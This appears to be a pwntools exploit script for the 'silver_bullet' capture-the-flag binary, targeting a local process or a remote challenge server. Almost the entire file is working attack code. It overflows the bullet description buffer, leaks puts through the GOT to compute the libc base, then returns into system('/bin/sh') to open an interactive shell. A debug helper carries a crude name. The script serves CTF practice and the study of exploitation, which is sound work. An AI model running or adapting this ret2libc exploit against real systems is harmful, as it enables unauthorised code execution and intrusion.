#coding=utf-8
from pwn import *
local = 1
exec_file="./silver_bullet"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",26570)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    print a.libs()
    for key in a.libs():
        if "libc-2.31.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x08048989
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(content):
    menu(1)
    a.sendafter("Give me your description of bullet :",content)
    return 

def delete(idx):
    return 
    
def edit(content):
    menu(2)
    a.sendafter("Give me your another description of bullet :",content)
    return 
    
def show(idx):
    return 
def beat():
    menu(3)
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

add('a')
edit('b' * 46)
edit('a')
payload = '\xff' * 3 + "aaaa" + p32(elf.plt["puts"]) + p32(0x8048954) + p32(elf.got["puts"])
edit(payload)
debug()
beat()
a.recvuntil("Oh ! You win !!\n")
libc_base = u32(a.recv(4)) - libc.sym["puts"]
fuck(libc_base)
add('a')
edit('b' * 46)
edit('a')
payload = '\xff' * 3 + "aaaa" + p32(libc_base + libc.sym["system"]) + "aaaa" + p32(libc_base + next(libc.search("/bin/sh")))
edit(payload)
beat()
a.interactive()
